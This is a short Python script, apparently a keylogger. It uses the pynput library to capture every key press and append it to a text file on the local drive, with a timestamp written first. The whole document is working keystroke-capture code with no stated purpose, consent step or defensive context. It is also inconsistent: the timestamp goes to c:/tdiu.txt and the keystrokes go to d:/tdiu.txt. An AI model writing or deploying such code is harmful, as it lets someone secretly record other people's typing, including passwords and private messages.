import time
from pynput.keyboard import Key, Listener
with open(r'c:/tdiu.txt', 'a') as file:
    file.write('\n'+str(list(time.gmtime(time.time()))[:5])+' ')
def show(key):
    with open(r'd:/tdiu.txt', 'a') as file:
        file.write(str(key))
    
 # Collect all event until released
with Listener(on_press = show) as listener:  
    listener.join()